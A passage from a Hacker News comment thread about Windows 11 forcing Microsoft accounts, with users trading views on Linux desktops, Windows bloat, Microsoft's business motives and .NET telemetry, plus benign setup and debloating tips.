failure\"s, then eventually they got it working but the system clock was months out So much more complex than linux it's crazy. Windows will never be ready for prime time until you can literally plug in and load a webpage like you can with a linux box. reply darkwater 8 hours agorootparentprevAnd to give a more Linux-positive spin \"there is always something that holds you... which is actually not that vital in the end once you lose it\" reply bishbosh 47 minutes agorootparentIt really has come a long way. Obviously this is one users needs, and other folks will find other things that are missing or not 100%. But the fact that in this case the conversation as moved from gaming more generally, to vendor specific overclocking is quite a sign of the times. reply eptcyka 8 hours agorootparentprevIt might be different people saying that, and with time, some blockers are removed, some people migrate, and a new set of would be linux users get bumped up in the queue where they are now at their last obstacle to using linux. reply account42 8 hours agorootparentA lot of these \"blockers\" are, to put it bluntly, merely excuses. Like ggp here didn't mention why he thinks ThrottleStop and MSI Afterburner are a must for him but but I doubt that they are truly irreplacable. More likely they provide some non-essential utility which would make this more about tradeoffs, or about just taking the plunge to feel the grass on the other side of the fence with your own feet. reply djaychela 8 hours agorootparentprevFor me, the something is the DAW i use (Cubase). I know it intimately, I make a living with it, and despite trying other alternatives, there isn't a DAW which runs on Linux which would cut it for me, in terms of overall features. If Cubase ran on linux (and all my current plugins could work), then I'd drop it in a heartbeat. I've been running Linux in various guises and roles since (I think) 1998, but it's never made it to the 'daily use, I can do everything in it' stage, despite quite a few attempts on my part to make it happen. reply vjulian 8 hours agorootparentI’m curious, how did you settle on PC vs Mac? I’m a PC user (Cubase), but there are certain unique advantages to Mac as a platform of course when it comes to music. I’m not wedded to brand personally but use PC as I find it more versatile in non-music tasks (and in music I am more a hobbyist these days). reply NikkiA 1 hour agorootparentI suspect > and all my current plugins could work holds the key, there are an immense amount of plugins that are PC-only, as I'm sure you're aware. The list of mac-only plugins is pretty tiny. reply Kim_Bruning 7 hours agorootparentprevhttps://appdb.winehq.org/objectManager.php?sClass=applicatio... Bother. You do seem to be stuck for now. reply walteweiss 8 hours agorootparentprev15 years ago, that was Photoshop that kept me back. I switched to macOS a couple of years later. Now, I switched to Linux, ditching Photoshop. So far so good. I can stand the life without Photoshop, but tolerating macOS or Windows is above me. reply M95D 7 hours agorootparentprevHow long does it take in linux for the context menu to open? In fact, is there a context menu at all? reply bishbosh 45 minutes agorootparentIt does have the advantage of context menus that contain all of the context, rather than a button to revert to an older version of the context menu that has what you actually want! reply veqz 7 hours agorootparentprevNot sure if the question was asked with sarcasm or not, but, me being me, I actually tested it here as soon as I read it: It's instant. OnMouseDown event, if you will. Using KDE Plasma 6. reply soraminazuki 33 minutes agorootparentIt's funny because it's the latest version of Windows that requires two clicks to get a non-broken context menu. It's either that or registry hacks that Microsoft hasn't disabled yet. https://superuser.com/questions/1674122/how-can-i-revert-to-... reply deaddodo 6 hours agorootparentprevI don't even know what a \"context menu\" is in this context. Are we just talking about a general right-click menu? If so, it's instant in both Windows 11 and KDE6 for me (desktop, toolbars, etc). Or do we specifically mean a context-filled context menu, such as the ones used in the file managers? If so, Dolphin definitely performs better than Windows Explorer, but that's a pretty useless micro-benchmark. The thumbnail and live preview processes are far more processor intensive/laggy in Dolphin/KDE, does that mean KDE is overall worse? No. reply branon 4 hours agoparentprevThere is nothing inherently special about ThrottleStop and MSI Afterburner, these are merely (proprietary) Windows-specific utilities for changing the behavior of your hardware. Running these programs on Linux would not make sense because their only purpose is to twist knobs in the Windows OS. Linux has different knobs so their functions do not apply. Thus your restriction is self-imposed more than anything, you are effectively saying \"the only thing stopping me from switching to Linux is that it's not Windows.\" Between your BIOS settings and programs like cpufrequtils and CoreCtrl there are equivalents to those programs, but interacting with hardware is platform-specific. You may have to learn different programs because Linux abstracts access to your hardware differently, thus your preferred Windows-specific utilities will not have any use :D This is in contrast to productivity applications like Adobe which could reasonably work the exact same way across platforms... if only they were cross-platform at all :( reply lencastre 12 minutes agoparentprevNext time install using English/World as locale. Then add your favorite language/region/keyboard after. Don’t know why, but it comes almost bloat free. reply jzxy 8 hours agoparentprev>I still can't imagine how they managed to make a context menu open in almost a full second They did make everything slower than it used to be when it comes to new UI elements, but the context menu can also be slowed down by third parties. On my machine, the primary cause was the shortcut to AMD radeon settings. You can remove it with this powershell command : Get-AppxPackage -AllUsers AdvancedMicroDevicesInc-RSXCMRemove-AppxPackage -AllUsers It was a major pain to find how to disable this thing. In fact, if you google \"AdvancedMicroDevicesInc-RSXCM\" (with the quotes, to get a verbatim search) you won't find more than a handful of results talking about its existence. It doesn't uninstall the settings panel itself, just the shortcut. Yes, the context menu shortcut is a standalone app package of its own. It's crazy. After uninstalling this AMD crap the context menu went from taking a second to being almost instantaneous. On other people's machines I've also remarked certain antivirus like Kaspersky causing major issues with 11's context menu performance. I thought the new context menu was all about fixing the mistakes of the previous ones when it came to the nasty things people can do in extending explorer.exe but seeing the behavior of those new third party additions to the menu, I guess not. reply philistine 6 hours agorootparentIt’s for these weird edge cases that I love macOS’ new Startup Items menu. It includes a list of everything that starts at boot, and everything running in the background that’s not the OS or Apple. I had been waiting for a feature like that all my life. Sure, put a weird little service hidden somewhere as a login item, but tell me so. I can now turn off Microsoft’s license validator ! reply karmakaze 5 hours agorootparentThe thing on the later macOS that opens so slowly is System Preferences. So annoying, and also how it always starts at Appearance (as if that's the most important) when I usually want the last thing I had opened before. reply ano-ther 8 hours agoparentprev> can't imagine how they managed to make a context menu open in almost a full second. In Windows 9x on a 200Mhz it was instant. A useless one too, because all the options that matter are in the old one. And the system sounds now take a few seconds to chime - often after I already dismissed the corresponding dialogue reply MrDresden 8 hours agoparentprevThis may not fulfill your needs in the way that MSI Afterburner and ThrottleStop do, however I would recommend checking out MangoHUD and cpufrequtils respectively for similar (but perhaps not identical) behaviour. reply chakintosh 7 hours agoparentprevUse Chris Tutus' Debloat utility https://github.com/ChrisTitusTech/winutil reply jinushaun 6 hours agoparentprev> I still can't imagine how they managed to make a context menu open in almost a full second. It’s probably One Drive and Dropbox. The cloud storage providers have to run a check on every context menu execution. It’s slow because MS closed the loophole that was previously used to implement that and provided an official API that does the same thing but worse and slower reply jorvi 8 hours agoparentprevYou don’t really need ThrottleStop if you go into your bios, turn off Turboboost and/or powerlimit your CPU. If your laptop bios doesn’t allow that, look for a “quiet” setting in the bios. This changes the PL1/PL2 to 35w/65w down from 85w/60w. With the NVK driver steadily improving, it feels like it is only a matter of time before something similar to Corectrl is written for Nvidia. I realize GreenWithEnvy exists, but it’s never worked well for me. reply williamvds 8 hours agoparentprev> MSI Afterburner, which are a must for gaming on my laptop If you want some unsolicited software recommendation: CoreCtrl offers similar controls to MSI Afterburner, at least on my AMD GPU reply stanski 5 hours agoparentprevSo just use Windows for gaming only. That's what I do which means I'm in Linux 99.9% of the time. reply nicman23 8 hours agoparentprevprivacy.sexy is pretty good reply utensil4778 2 hours agoprevMy husband is a normal layperson who treats his computer like an appliance. It's just there to do word processing and web browsing. He's been asking me to buy him a new laptop and specifically wants Windows on it. I've been struggling for weeks trying to explain to him why Windows is bad and why I don't want to setup and manage his spyware machine. I've convinced him to at least try a few Linux distros to see what he's comfortable with, but he either doesn't understand why Windows is bad or just doesn't care. For now I'm avoiding purchasing the new machine, and he's begrudgingly using my manjaro laptop. I really don't know what to do about it. The most solid argument I've got so far is that I can't help him with any of the inevitable windows 11 issues because I just don't use windows anymore. reply causal 9 minutes agoparentWhy not a Macbook? I get why people might hate Apple as much as MS, but it's certainly more privacy friendly than Windows and more user friendly than Linux. And yes I know Linux has come a long way - I use it daily - but there is still significant friction for non-technical users. reply SergeAx 1 hour agoparentprevIf I understand correctly, you still can get Windows 10, which can be activated with local user: https://www.microsoft.com/en-us/software-download/windows10 It is also more customizable in terms of disabling some (most?) spyware features using 3rd party tools. It's an effort, but I think your marriage is worth it. reply CoastalCoder 2 hours agoparentprevThat's a tough situation. Marriage is one of those relationships where hard-line stances (on either side) can be really damaging. reply theGeatZhopa 2 hours agorootparentSo, to resolve this tough situation: get rid of what you can't control. He will find help with Windows elsewhere.. reply Mountain_Skies 2 hours agoparentprevHe's his own person. You want to help him avoid future headaches and protect his privacy but ultimately, he is his own person who should be able to make his own choices. Understandably this is difficult for you since you are being asked to buy the new laptop and have valid reasons for not wanting to purchase one with Windows but none of that changes the fact that he is his own person with his own thoughts. You may feel complicit in any trouble his choice brings him since you're involved in the purchasing process but that's on him, not you, if it ends poorly. reply ryandrake 2 hours agorootparentI set up a separate VLAN on my home network to isolate all Windows machines from the rest of the LAN and strictly lock down their access to the outside world, too. Maybe that is an option for OP's home network? Windows machines can safely coexist on your network, but you need to treat them as attackers in your threat model. reply xnx 2 hours agoparentprevChromeOS might be a good option. reply mrweasel 8 hours agoprevOther than being able to gobble up user data and being able to associate it with a person (or at least an email address) and later sell that information, what is Microsoft reasoning for refusing local accounts? This whole obsession with forcing users to create a Microsoft account is really weird. It may provides some features for certain types of users, but I really don't see any reason for forcing a Microsoft account. Apple also REALLY want you to have an Apple ID, but you don't have to. I still fail to see why Microsoft doesn't go all in on privacy, do they really need the extra profit from advertising? Microsoft doesn't give a shit about the desktop anymore and at this point they're also stopping to care about the business customers, unless they can move them to subscription based services in the cloud. reply Brian_K_White 7 hours agoparentThey can charge a recurring and increasing subscription fee for on-line accounts and services. And of course data. Before they can do that, they first have to get everyone dependant on the on-line account and services, because most would not voluntarily knowingly agree to be charged a subscription just to use their own computer, not intentionally using any external services. So step 1 is do not charge for the basic account combined with force everyone to use it. Most will go along with this because it's free this exact minute and most people follow strictly the path of least immediate resistance. You can make most people do anything you want by just making anything else 0.0001% more difficult. This is not cynical, this is studied. In the olde dayes, if you wanted to sell a subscription service, you created a service and then convinced people to become paying customers. MS is tricking everyone into becoming customers first, and then when the deed is done, inform them they are now paying customers. And of course also data. reply anal_reactor 7 hours agorootparent> Most will go along with this because it's free this exact minute and most people follow strictly the path of least immediate resistance. You can make most people do anything you want by just making anything else 0.0001% more difficult. This is not cynical, this is studied. This is terrifyingly accurate. reply andyferris 8 hours agoparentprevThe reasoning is Microsoft is now in the services (as well as advertising) business, with traditionally-licensed desktop software revenue becoming less and less important. Which you kinda stated in the last sentence. The reasoning for not going all in on privacy is because they want to maximise services and advertising revenue, and they also sell to government and enterprise who actually like the ability to spy on their employees. There's not much financial incentive or government regulation to make them focus on consumer/end-user privacy. reply account42 8 hours agoparentprevSome exec at microsoft probably has their promotion depend on user growth and is able to push the Windows team to implement this crap. Things megacorporations do don't really have to make long-term sense for the organization as a whole - they only need to provide a short-term advantage to someone in the hierarchy. reply chronogram 7 hours agorootparentRight. You can retroactively think of all sorts of reasons, and people internally will talk about it and make presentations and plan meetings over it, but it's just a gigantic corporation and it doesn't think, it's a number that can be chased. reply xg15 8 hours agoparentprevThe also seem to have an odd relationship to the US government, to the point where they sometimes come over as a half-public entity. (See the domain seizure and other anti-cybercrime operations where the FBI and DHS were very openly cooperating with MS, even though MS had no direct involvement in the cases) Maybe they just think of them selves as part of the government already and believe they are too big to fail... reply aniviacat 8 hours agoparentprevTwo reasons I can think of to force the creation of a MS account is to a) make it easier to get started using MS products (e.g. Office), since you don't need to go through the hassle of creating an account; it just works and b) once (almost) everyone has a MS account, using MS oauth may become the default login mechanism for many third party services (although Google is already starting to take up this space). reply irusensei 7 hours agorootparentc) report to (their real) customers and shareholders the number of people that are using their OS and measure the reach of start menu ads. reply squarefoot 8 hours agoparentprev> but I really don't see any reason for forcing a Microsoft account. Microsoft has ties with many governments. I wouldn't be much surprised if the reason they amass user data had nothing to do with selling that data to companies. reply coffeeling 7 hours agorootparentThe big players would be fools to sell data, as such. Their whole thing is that they are so big they can target ads effectively. You'd be a fool to sell that data. They sell ad targeting and ad placement, not the data to do those things. reply coffeeling 8 hours agoparentprevMoney is money, and companies want more. Of course if they notice they can both sell you the product and have you be the product, they'll ask themselves \"Why not both?\" The login thing is also probably partly because it does genuinely make the user experience better - log into a computer, To Do has your tasks, OneDrive and OneNote start fetching your notes and files, Edge seamlessly syncs your browser history, and so on. Things Just Work™. MS has a cloud-based clipboard and Edge has a OneDrive-backed AirDrop clone. All of that needs accounts to function properly. reply thallium205 8 hours agoparentprevPiracy reply Dalewyn 8 hours agoparentprev>It may provides some features for certain types of users, but I really don't see any reason for forcing a Microsoft account. To play Devil's Advocate, I can see some: * Backups. Let's face it, most people do not and will not take backups and yet they all cry when they inevitably suffer data loss. OneDrive syncing everything at gunpoint is a holy grail in the face of this problem. * Sync. Clearly, most people like all their computers looking, having, and acting more or less interchangable with all their others. Together with backups above, OneDrive and a Microsoft account bring this to fruition. * Licenses. Most people aren't going to keep the Windows box with the key around, or neatly store the documentation (which contains licensing information) they get with their new laptop or big box desktop. Chances are they're all in the trash the next day. Tying license activations to Microsoft accounts addresses a lot of headaches around lost licenses. I, as a tech nerd, hate it. But if I hang up my nerdism at the front door and see things as a normal man with too much shit to do and too little time to deal with 'pooters, why yes, a lot of this actually makes fucking common sense. reply haspok 8 hours agorootparentWrt licences, these days laptops have their Windows licence burnt in their BIOS (and this has been the case for some time now). Backups and sync are great, except if someone doesn't want to upload all their data to the cloud. There could be many reasons for this, I'm sure you can list some of them too. reply Kim_Bruning 7 hours agorootparentI understand that some cloud providers (now) scan stuff you put into cloud storage. This could be a problem if you're dumping terabytes of stuff. Maybe a million monkeys on a million keyboards might never trigger a false positive on modern sophisticated scanners; but now make it a billion or a trillion. reply cjk2 8 hours agoprevMore user hostility. Less user choice. I remember a few years ago on here everyone crowing about the new Microsoft and how it wasn't like the old one. It's notably worse a this point. reply cageface 8 hours agoparentI’m very uncomfortable with the degree to which I’ve become dependent on VSCode, GitHub, and Typescript. Microsoft has the same incentives to exploit their users now that they always have. reply cjk2 8 hours agorootparentI've purposely avoided all three of those for that very reason. I've spent 30 years working with Microsoft stacks. It paid the mortgage off but it's been hell from a churn and lock in perspective. So much ROI was wasted on rewrites because of their policies and schizophrenic direction changes. I'm in a different space now and I am blessed that my editor is vim, my language is either Go or Julia and my VCS is Fossil. reply neonsunset 6 hours agorootparent> Go Funny. Great choice! Almost makes one believe the company behind it is not the biggest driver of AdTech in the world, whose business model is built entirely on selling user data, and that company also has propensity to kill much beloved and heavily used projects no matter how ridiculous the move is. reply baq 8 hours agorootparentprevFortunately I think we're good here given how MS org chart[0] looks like. [0] https://i.imgur.com/XLuaF0h.png reply lioeters 7 hours agorootparentprev> VSCode, GitHub, and Typescript So true. Majority of my time on the computer is dominated by these, and I'm not comfortable they're all owned by Microsoft. I don't see how they could ruin a programming language, but a code editor and centralized code repository.. Especially the latter, I'm surprised how long it's been since the acquisition and so far it's been mostly unaffected by the inevitable enshittification. The only thing that will incentivize Microsoft from ruining these admittedly great products is the existence of viable alternatives. Same with Windows, minus the great part. reply alkonaut 7 hours agoparentprevMicrosoft is famously a handful of very different and very large companies who don't seem to speak. The DevDiv part is a lot different now than 20 years (or even 10) ago. The other sides of Microsoft are mostly the same as they always were. Microsofts OS division have bet everything on the strategy that \"enthusiasts\" aren't going to run Windows anyway. It's a segment they never cared about, and nothing indicates they ever will. I don't agree with the strategy (because it's these enthusiasts who recommend things to everyone around them and of course fix their parents machines every Christmas since the 90s), but I'm going to guess that more clever people than me have run the numbers and reached the conclusion that it's better to alienate our 10% of the Windows user base while catering only to enterprises and the non-tech-savvy users who are actually likely to buy the subscription recommended on the start menu. We weren't going to do that anyway now were we? reply cjk2 7 hours agorootparentI don’t agree with this. You can run macOS without this crap so why can’t you run windows without it? macOS is arguably less enthusiast oriented than windows. Microsoft is one facade regardless of who is underneath it and they are aligned in user hostility at the moment. Even devdiv is a mess. reply alkonaut 6 hours agorootparent> You can run macOS without this crap so why can’t you run windows without it? MacOS is a service tied to selling an expensive piece of hardware. They don't need to make money by selling MacOS, they make money selling the Mac. Microsoft makes money selling Enterprise Windows licenses, Office subscriptions, OneDrive subscriptions, AppStore cuts etc. But they let Acer put an OEM copy of Win11 Home edition with very little markup because it's likely that these customers will a) ensure thir employers keep running windows because everyone knows it and b) they are likely to buy a OneDrive/Office365/whatever subscription. > Even devdiv is a mess. How so? reply pcdoodle 5 hours agorootparentprevThis is a very good point. A lot of purchases in tech are recommended from a friend or family member. From 95 - Windows 7, I could talk grandma through her problems without even being near a computer. Now the start menu can't even search properly. reply HeckFeck 8 hours agoparentprevThe only thing I can praise is the .NET Core ecosystem. C#, ASP.NET and EF is very comfy for web dev compared to my experiences with Java and its thousand moving parts. That said, I still fear what may come. The decrees from on high concocted by the unscrupulous bugmen that are breathing absolute contempt for their users. Who can ponder their designs while maintaining his conscience? reply ptx 7 hours agorootparent.NET Core would be great if it weren't tainted by the New Microsoft policy of turning all tools into spyware. Now you have to remember to set DOTNET_CLI_TELEMETRY_OPTOUT=1 everywhere and meticulously ensure that it doesn't get stripped from the environment when launching subprocesses, changing users, etc. reply cjk2 7 hours agorootparentI remember the discussion about that which boiled down to: it’s good for you - shut up. That was the thing that kicked me over the fence. Open source doesn’t matter if the stewards do not have your best interests at heart. reply neonsunset 7 hours agorootparentprevThe list of what is gathered: https://learn.microsoft.com/en-us/dotnet/core/tools/telemetr... As you can see, it is system data and basic crash reporting, something that helps with the health of .NET ecosystem and has no monetary value. reply ptx 6 hours agorootparentThey used to gather all command line arguments until they later decided that (oops!) it's \"not acceptable per our privacy policies\"[0] and they really shouldn't have been doing that. They have also had issues with anonymization not being implemented properly, the opt-out mechanism not working in some edge cases, forgetting to even tell users about the need to opt out, and who knows what else. The risk of accidentally exfiltrating your data one way or another seems pretty high. Also, monetary value is not the only reason you might want to keep information private. [0] https://github.com/dotnet/sdk/issues/6145#issuecomment-22010... reply neonsunset 6 hours agorootparentThe issue dates back to the release candidate of the second version of .NET Core, 8 years ago. Surely we can do better than \"it used to be bad at x point in time and this can never be rectified\". I like my privacy more than the next guy, but you are not arguing in good faith (which is all too common, because people like to use much inferior technologies and make .NET a scapegoat, instead of learning better and ceasing idiotic self-sabotage) Edit: Heh, in HN jail. In response to the comment - you should apply this logic to the languages steered by Google, Oracle and Apple. .NET is completely unrelated to Recall and whatever happens to it, it could have been as well a separate company. reply macintux 6 hours agorootparentMicrosoft does not make it easy to give them the benefit of the doubt. See, for example, the Recall debacle. https://doublepulsar.com/recall-stealing-everything-youve-ev... reply JeremyNT 6 hours agoparentprev> I remember a few years ago on here everyone crowing about the new Microsoft and how it wasn't like the old one. People here still do this, despite all evidence to the contrary! I have concluded that a large percentage of hn users simply work at Microsoft or one of its subsidiaries (eg GitHub). reply simiones 8 hours agoparentprevHonestly I think both things are true: the consumer apps division of MS is more open and is being allowed to follow the money, even to other OSs. The Windows division is doubling down on all of the worse practices that the law allows them to try to extract some more value from their users. Thankfully the EU has forced them to curb some of these practices, even if the process is still intentioanlly obtuse. For example, you can't upgrade to an EU version of Windows if you didn't start with one - you have to reinstall Windows from scratch, without preserving any other user settings, and choose an EU country as your locale at this step. Only then do you get to uninstall Edge and no longer need to manually opt-out of all their tracking crap. I'm sure they've still kept a lot of illegal tracking around for now too, though I'm hopeful that in time they'll be forced to remove even that. reply cjk2 8 hours agorootparentI would rather hope the vendor has the right policy, not that a multi-national union forces it to have the right policy. reply simiones 7 hours agorootparentUnfortunately many people, in particular the leaders of industry in the USA, believe essentially the opposite: that any company almost has a duty to extract as much profit as legally possible, or even beyond, assuming profit > fines. reply chrisandchris 8 hours agoparentprevI wonder when Europe starts to stop this and also forces Microsoft to stop users from the hard requirement for an online account. It's about time. I mean, they could make a ton of money by charging users for Windows without tracking/online accounts/bloatware. reply alkonaut 7 hours agorootparentI'm guessing that selling OS:es to consumers isn't making a ton of money. Most would come as OEM for a small Windows tax on a new computer. The money is in AppStores, OneDrive subscriptions, Office 356 subs and so on. And letting people run some sort of no-frills windows where you login as a local account and run your old spreadsheet for 10 years is completely at odds with any kind of strategy that will make money from home users. I don't like it - but I'm also not disagreeing with the beancounters at ms if this is the conclusion they reached. I have a feeling it's the right call. reply chrisandchris 7 hours agorootparentI'm not saying that MS shouldn't sell M365 or similar. The thibgs you mentioned are not exclusive to my issue. I would be willing to pay for an OS that has no Candy Crush, LinkedIn and whatever installed and that would allow to use local accounts. I also don't want forced reboots because of updates. Yet, I still would use OneDrive, M365, ... It's currently possible to to run your Office 2010 on Win 10/11, there's nothing holding you back. reply alkonaut 7 hours agorootparent> I would be willing to pay for an OS that has no Candy Crush, LinkedIn and whatever installed and that would allow to use local accounts. Me too. But I do agree with the beancounters at MS that putting such an OS on the market might reduce sales of store apps or O365 subscriptions or make it less convenient for people to use OneDrive backup etc - in a way that costs them more than they would make from selling this great version of Windows to very few enthusiasts. Btw I think there are lots of differences between getting a good LTSC install now, vs if you have an OEM Home version of Win 11. A lot of my complaints only apply to the \"bad\" SKU's of Windows and not generally. The problem is of course that you can't buy this \"good windows 11\". It's reserved for volume license customers. reply bee_rider 8 hours agoprevI have a theory, which I have no way of backing up or testing at all, that the entire slump in the laptop segment is driven by the fact that Windows is just utterly user-hostile garbage, and there aren’t any alternatives really, other than MacOS, which is too tied to Apple. Like any reasonable tech savvy person I use Linux of course, but I’d have trouble suggesting it… lots of people just don’t want to use the terminal at all. reply TheCapeGreek 8 hours agoparentI agree. I've been a Linux user since 2017, and in the last year transitioned to an M1 MBP for the battery life (cheaper than buying an inverter+batteries in South Africa with loadshedding). Tried to upgrade to a new machine last month. New-ish (and not name brand) hardware made Linux unusable on it (keyboard & BT wouldn't work), while Windows was passable. After some work I decided to try working on Windows again. Honestly the worst OS experience I've had in years, because at every step there's some default setting that basically equates to \"Microsoft will do whatever they want on your machine\" and it's hard to turn off permanently. Then I tried to go back to Manjaro where I had a stable work experience from 2020-2022, and compared to macOS, it was just a pain getting the same dev environment back up. Ubuntu wouldn't have been much different. I dislike Apple for a lot of things, and really don't like the absurd Apple Tax on having a usable amount of RAM, but it is still the best (and most stable) dev machine I've had in years. reply haspok 8 hours agorootparentTo be fair, it is quite typical for cutting edge hardware not working in Linux for the first few months. Kernel devs have to catch up, and depending on your distro this might take a while. Best is to wait until support matures, or go with last year's option. (Not that it really makes much difference in Intel-world anyway, the difference these days is not very noticeable - I am typing this on a Thinkpad X1 Gen 5, which was released... in 2017. Can't justify buying a new laptop, each year I have a look and wonder, what the benefit would be.) reply bee_rider 6 hours agorootparentiGPUs are getting better at a good clip, I think. Maybe we can have GPiGPU worth caring about soon. reply bee_rider 7 hours agorootparentprevI don’t think I could use a MacBook, I enjoy tinkering with my computer too much. I loathe cellphones, though, so I have an iPhone. It is fine. It belongs to Apple really. Someday maybe it will be easy enough to put together something like a Raspberry Pi cellphone. But, for now, I’ll just rent one from Apple and let them handle everything. They make fine devices for people who don’t like that type of device. No wonder they are doing so well, people who hate tech is a huge market, and we’re doing our best to expand it every day. reply cjk2 8 hours agorootparentprevSame situation here. Apple is not the best option, but it's the least shit. reply aaomidi 8 hours agorootparentprevYou went to the one OS that’s practically universally shunned because of how unstable it makes arch systems n.n reply fattegourmet 8 hours agoparentprev>lots of people just don’t want to use the terminal at all That's unfortunate, since the article notes: \"Another method of bypassing the account lockdown still exists. You simply have to enter OOBE\\BYPASSNRO in the command prompt during the Windows 11 setup process, which allows you to skip the connection to the Internet and thus also the link to a Microsoft account.\" reply orev 2 hours agorootparentUsing the terminal for day to day things is different than having to use it one time during the setup process. reply nope1000 8 hours agoparentprevBut do they know they don't have to use a terminal? You can use Linux Mint perfectly fine without ever opening a terminal, like MacOS. Seems like more of a reputation issue. reply baobun 8 hours agorootparentIt's an issue of supply-chains and gap in the market. I can't buy a generally competitive Linux Mint (or anything similar) device in a shop anywhere in my country as far as I know. Whereas existing vocal demand are generally tinkerer types who often want the opposite of what we actually need. So I can see why it's a difficult market to bootstrap. Meanwhile, incumbent hardware vendors have competence and interest elsewhere and are probably getting decent incentives from Microsoft... Valve's been bringing eberyone forward. I wish System76 et al to keep on their optimistic trajectory, for what that's worth. And Framework would be in a great position to spin out a dist or just offer a community install (fingers crossed Manjaro don't get them loljk). reply quantumspandex 8 hours agorootparentprevOnly if all you ever do is web browsing and do some light office work. As soon as you have to troubleshoot something or install some less popular software, you can't avoid it. reply nope1000 4 hours agorootparentI would hazard a guess that this (+ gaming) is how most people use their personal computers. Most users live in their browsers. reply bee_rider 7 hours agorootparentprevI don’t know. I prefer to use the terminal wherever possible, so any “you can use Linux without the terminal” advice I’d give would just be me passing along stuff I heard on the internet. I’m not going to proactively offer that up. reply npteljes 5 hours agoparentprevSince there are smartphones, they are the most convenient everyday computing devices. They are a great and useful package of functionality, a real swiss army knife of digital capabilities, and their portability is on another level, compared to a laptop. So what actually happened is that people don't buy laptops, because they already have smartphones, and the smartphone can basically do everything they need to do. With suggesting Linux, I too have trouble, but honestly, that's mainly because people don't need it. I believe it to be superior to Windows, morally and technologically, but the fact is that people prefer convenience, and Windows is more convenient. Windows also has a lot of moat built by business machinations, so now the de-facto PC platform is Windows, and the de-facto office formats are MS Office formats, and while Linux has some compatibility, this is not something that people want to fiddle with, when they just need it \"work\". What actually works is when manufacturers build an entire OOTB experience on top of Linux - like how the Steam Deck is. reply Etheryte 8 hours agoparentprevThe sad reality is that Linux that e.g. my mom and dad could use day in and day out without any tech support always feels like it's a few years away, and has felt that way for decades now. Linux won the server space, but outside of that, it's a hard sell to suggest anyone not tech savvy should use it. I'm sure there's loads of people who do use it despite the pains anyway, but for the wider audience I don't really see it as a realistic alternative. Sure, you can use a browser on any distro and pretend it's fine, but the buck stops the moment something as innocent looking as printing or transferring a file to your phone comes up. reply blueflow 8 hours agorootparentI think we crossed the point where Linux is less shitty than Windows. KDE and XFCE can compete. reply Etheryte 8 hours agorootparentThat could very well be, but less shitty is the wrong metric. Can get shit done is the right metric, regular users don't care about corporate telemetry and adware so long as it doesn't get in the way of getting their stuff done. A good example of what I mean is a work event I attended a year or two ago. We had a bunch of guys up on the stage and between the lot they probably had over a century of combined Linux experience. Still, it took them a good 10-15 minutes to get the projector working. Now imagine a regular user in that situation. reply bee_rider 7 hours agorootparentFor some time I had a Linux NUC, so no monitor. When I had to give a presentation I’d set it up to boot straight into the slides. I thought that was pretty slick. I’d bring a keyboard for emergencies but didn’t need to plug it in, just a slide advancer. But it required preparing beforehand. Linux is the Batman of OSes. You can do anything, but it requires prep time. reply Kim_Bruning 7 hours agorootparentprevWho says the windows or mac users would be any quicker, per-se? Some days the windows folks get lucky, sometimes the mac folks get lucky, and some days the Linux person might actually get done faster than everyone else (it has happened!). If you need to use local hardware you haven't used before; it's always a good idea to arrive well in advance to get yourself set up. You never know what you might run in to. reply ryandrake 1 hour agorootparentprevYou're exactly right. Many normal users are \"single issue voters\" when it comes to OS choice. Linux could be the best operating system in the world, and Windows could be flaming trash that will drain your bank account and shoot your puppy, but if the user has an application that's important to them that runs on Windows but not Linux, they will always choose the \"shoot my puppy\" choice because at the end of the day they just want to ruin that application. reply blueflow 8 hours agorootparentprevHow? I thought this was a solved problem. I've been using arandr for a decade. reply bee_rider 6 hours agorootparentHard to guess, if someone doesn’t use many different setups they might just not be familiar with arandr. reply squarefoot 8 hours agorootparentprev> it took them a good 10-15 minutes to get the projector working. I installed my old projector ages ago, on a 1st version PPC Mac Mini running Debian and the Freevo media player (if memory serves, Kodi didn't even exist as XBMC back then). No problems whatsoever setting up the whole thing, aside the atrociously loud BONNNG! the Mac Mini played when turned on, but that's another story. I think setting up hardware is a hit and miss, and sometimes crap happens also under Windows where drivers are packaged according to brand, not chipset, and often bring all sort of junk with them. reply mistercheph 7 hours agorootparentprevHow disingenous, this comedic scenario is literally a mainstay at any tech conference reply bartvk 8 hours agoparentprevChromebook, if you're okay with Google having your data. reply lioeters 7 hours agorootparentSigh. This is the state of personal computing in the early 21st century. Most people are running operating systems and computers made by corporations that are actively user hostile, hungry for private data (except maybe Apple), and experts at dark patterns. Scammy behavior has become normalized throughout the industry. Kinda makes me think, tech literate people have a moral responsibility to push back somehow and contribute towards a more healthy relationship between technology and humanity. reply figassis 8 hours agoparentprevI fully agree. There is no choice. People need to be on a certain income bracket to own macs. On a certain tech literacy level to own Linux laptops. So They've all been born and grew up on Windows. Recently I setup a recently purchased windows laptop. Cleared all the crap, did not have the energy to work around online accounts, so setup one. All working. Great! 6 months later, Genuine Windows warning shows up on desktop, windows keeps asking to add product key. We never received one. All the guides to retrieve it fail. I gave up, wiped the machine, installed Linux but had to give the person another windows laptop bc they had no idea how ot use Linux desktop. Currently, my brother wants my help setting up some apps on his windows (he's an architect, so you know the heavy CAD stuff). I'm running away from him like the plague...managed to avoid him for 2 months, wonder how long I can last til he corners me. reply pcdoodle 6 hours agorootparentWith open core legacy patcher, there are quite a few of us enjoying 2012 and newer MacBooks that cost as little as $150. reply squarefoot 8 hours agoparentprev> the entire slump in the laptop segment is driven by the fact that Windows is just utterly user-hostile garbage Partially true, but I wouldn't rule out the marketing driven belief that cellphones are just like smaller laptops, which is utter BS. Regarding Linux, I've installed Manjaro on some laptops and desktops for non techies, even seniors, and all of them (but one due to incompatibility with a proprietary Windows app) kept using it without any issues. I'm more a Debian user, also liking Alpine a lot on small systems and servers, but found Manjaro to be quite good for laptops and desktops that need to just work without fiddling too much with the command line. reply thefz 8 hours agoparentprevnext [7 more] [flagged] bee_rider 7 hours agorootparentApple was worse that Microsoft for some time, because they were actually competent enough to lock users out of their devices. Unfortunately MS has improved their code quality to the point that there’s only one work around for their latest attack on their users. At this rate they might completely defeat their users by windows 13 or 14. reply xcv123 8 hours agorootparentprevhttps://brew.sh https://asahilinux.org reply thefz 7 hours agorootparentBare bone functionality and half of the hardware not working. No thanks, keep your apple computers, they are going to be in a landfill soon anyway. reply xcv123 7 hours agorootparentMost of the hardware is supported now. My old HP laptop disintegrated within a few years and became landfill, but my 9 year old Mac is indestructible and runs anything I want. Linux, Windows, macOS. Also repaired it myself (new battery, new left speaker). The latest Macs are built like tanks and will easily last 10+ years. reply fattegourmet 8 hours agorootparentprevYour reply seems entirely focused on Apple, when the article is about Windows 11. 